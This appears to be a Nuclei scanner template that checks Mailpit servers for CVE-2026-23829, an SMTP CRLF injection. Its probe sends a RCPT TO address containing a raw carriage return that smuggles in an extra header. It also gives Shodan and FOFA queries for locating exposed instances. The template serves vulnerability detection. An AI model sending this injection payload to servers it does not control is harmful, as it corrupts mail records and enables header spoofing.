id: CVE-2026-23829

info:
  name: Mailpit < 1.28.2 - SMTP CRLF Injection
  author: omarkurt
  severity: medium
  description: |
    Mailpit versions before 1.28.2 are vulnerable to SMTP CRLF Injection due to an insufficient  Regular Expression used to validate RCPT TO and MAIL FROM addresses. An attacker can inject arbitrary SMTP headers by including carriage return characters (\r) in the email address, as the regex intended to filter control characters fails to exclude \r and \n.
  impact: |
    An attacker can inject arbitrary headers into captured emails, corrupt existing headers like the Received header, and generate malformed .eml files. This violates RFC 5321 which forbids control characters in envelope addresses.
  remediation: |
    Upgrade Mailpit to version 1.28.3 or later which updates the regex to explicitly exclude all ASCII control characters (\x00-\x1f) from email addresses.
  reference:
    - https://rosecurify.com/advisories/RO-26-002-mailpit-smtp-header-injection/
    - https://github.com/axllent/mailpit/security/advisories/GHSA-54wq-72mp-cq7c
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N
    cvss-score: 5.3
    cve-id: CVE-2026-23829
    cwe-id: CWE-93
    cpe: cpe:2.3:a:axllent:mailpit:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 1
    vendor: axllent
    product: mailpit
    shodan-query: title:"Mailpit"
    fofa-query: title="Mailpit"
  tags: cve,cve2026,crlf,smtp,mailpit,axllent,injection

network:
  - inputs:
      - data: "EHLO test.local\r\n"
        read: 1024
      - data: "MAIL FROM:<attacker@test.local>\r\n"
        read: 1024
      - data: "RCPT TO:<victim\rX-Injected: nuclei-test>\r\n"
        read: 1024
      - data: "QUIT\r\n"

    host:
      - "{{Hostname}}"

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "250"

      - type: word
        negative: true
        words:
          - "501"
          - "500"
          - "553"
